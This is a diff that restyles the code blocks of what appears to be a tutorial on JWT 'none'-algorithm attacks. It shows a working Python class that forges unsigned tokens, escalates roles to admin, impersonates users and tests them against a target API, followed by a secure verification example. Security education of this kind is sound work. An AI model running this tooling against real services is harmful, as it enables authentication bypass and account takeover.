@@ -84,15 +84,15 @@ import json
 
 token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
 
-parts = token.split('.')
+parts = token.split(".")
 
 # Decode header
-header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
+header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
 print(f"Header: {header}")
 # Output: {'alg': 'HS256', 'typ': 'JWT'}
 
 # Decode payload
-payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
 print(f"Payload: {payload}")
 # Output: {'sub': '1234567890', 'name': 'John Doe', 'role': 'user', 'iat': 1516239022}
 ```
@@ -112,6 +112,7 @@ import json
 import requests
 import sys
 from typing import Optional
+
 
 class JWTNoneAttack:
     # All known variations of the 'none' algorithm value
@@ -133,24 +134,23 @@ class JWTNoneAttack:
 
     def _base64url_encode(self, data: bytes) -> str:
         """Base64URL encode without padding."""
-        return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
+        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")
 
     def _base64url_decode(self, data: str) -> bytes:
         """Base64URL decode with padding restoration."""
         padding = 4 - len(data) % 4
         if padding != 4:
-            data += '=' * padding
+            data += "=" * padding
         return base64.urlsafe_b64decode(data)
 
     def _decode_token(self, token: str) -> tuple:
         """Decode JWT header and payload."""
-        parts = token.split('.')
+        parts = token.split(".")
         header = json.loads(self._base64url_decode(parts[0]))
         payload = json.loads(self._base64url_decode(parts[1]))
         return header, payload
 
-    def craft_none_token(self, modified_payload: dict,
-                          alg_variant: str = "none") -> str:
+    def craft_none_token(self, modified_payload: dict, alg_variant: str = "none") -> str:
         """Craft a JWT with the none algorithm and modified payload."""
         # Create header with none algorithm
         header = {"alg": alg_variant, "typ": "JWT"}
@@ -162,8 +162,7 @@ class JWTNoneAttack:
         # Token with empty signature (just trailing dot)
         return f"{header_encoded}.{payload_encoded}."
 
-    def craft_privilege_escalation(self, role_field: str = "role",
-                                     admin_value: str = "admin") -> list:
+    def craft_privilege_escalation(self, role_field: str = "role", admin_value: str = "admin") -> list:
         """Create tokens with escalated privileges using all none variants."""
         tokens = []
         modified_payload = dict(self.original_payload)
@@ -175,15 +174,13 @@ class JWTNoneAttack:
 
         return tokens
 
-    def craft_user_impersonation(self, target_user_id: str,
-                                   user_field: str = "sub") -> str:
+    def craft_user_impersonation(self, target_user_id: str, user_field: str = "sub") -> str:
         """Create a token impersonating another user."""
         modified_payload = dict(self.original_payload)
         modified_payload[user_field] = target_user_id
         return self.craft_none_token(modified_payload)
 
-    def test_none_variants(self, endpoint: str = "/api/profile",
-                            headers: Optional[dict] = None) -> list:
+    def test_none_variants(self, endpoint: str = "/api/profile", headers: Optional[dict] = None) -> list:
         """Test all none algorithm variants against the target."""
         results = []
         base_headers = headers or {}
@@ -197,11 +194,7 @@ class JWTNoneAttack:
             test_headers["Authorization"] = f"Bearer {token}"
 
             try:
-                response = requests.get(
-                    f"{self.target_url}{endpoint}",
-                    headers=test_headers,
-                    timeout=10
-                )
+                response = requests.get(f"{self.target_url}{endpoint}", headers=test_headers, timeout=10)
                 result = {
                     "variant": variant,
                     "status_code": response.status_code,
@@ -216,12 +209,7 @@ class JWTNoneAttack:
                     print(f"  [SAFE] alg='{variant}' -> {response.status_code}")
 
             except requests.exceptions.RequestException as e:
-                results.append({
-                    "variant": variant,
-                    "status_code": 0,
-                    "accepted": False,
-                    "error": str(e)
-                })
+                results.append({"variant": variant, "status_code": 0, "accepted": False, "error": str(e)})
 
         return results
 
@@ -236,8 +224,8 @@ class JWTNoneAttack:
 
         # Different signature formats
         variants = [
-            f"{header_encoded}.{payload_encoded}.",      # Empty signature with trailing dot
-            f"{header_encoded}.{payload_encoded}",       # No trailing dot
+            f"{header_encoded}.{payload_encoded}.",  # Empty signature with trailing dot
+            f"{header_encoded}.{payload_encoded}",  # No trailing dot
             f"{header_encoded}.{payload_encoded}.AA==",  # Minimal base64 signature
         ]
 
@@ -262,9 +250,9 @@ def main():
     print(f"\nOriginal Token Header: {attacker.original_header}")
     print(f"Original Token Payload: {attacker.original_payload}")
 
-    print(f"\n{'='*60}")
+    print(f"\n{'=' * 60}")
     print("Testing None Algorithm Variants")
-    print(f"{'='*60}")
+    print(f"{'=' * 60}")
     results = attacker.test_none_variants()
 
     vulnerable = [r for r in results if r.get("accepted")]
@@ -306,6 +294,7 @@ If the server uses RS256 (asymmetric), an attacker who knows the public key can:
 # Secure JWT verification - always specify allowed algorithms
 import jwt
 
+
 def verify_token_secure(token: str, secret_key: str) -> dict:
     """Verify JWT with explicit algorithm allowlist."""
     try:
@@ -317,7 +306,7 @@ def verify_token_secure(token: str, secret_key: str) -> dict:
                 "require": ["exp", "iat", "sub"],  # Required claims
                 "verify_exp": True,
                 "verify_iat": True,
-            }
+            },
         )
         return payload
     except jwt.InvalidAlgorithmError:
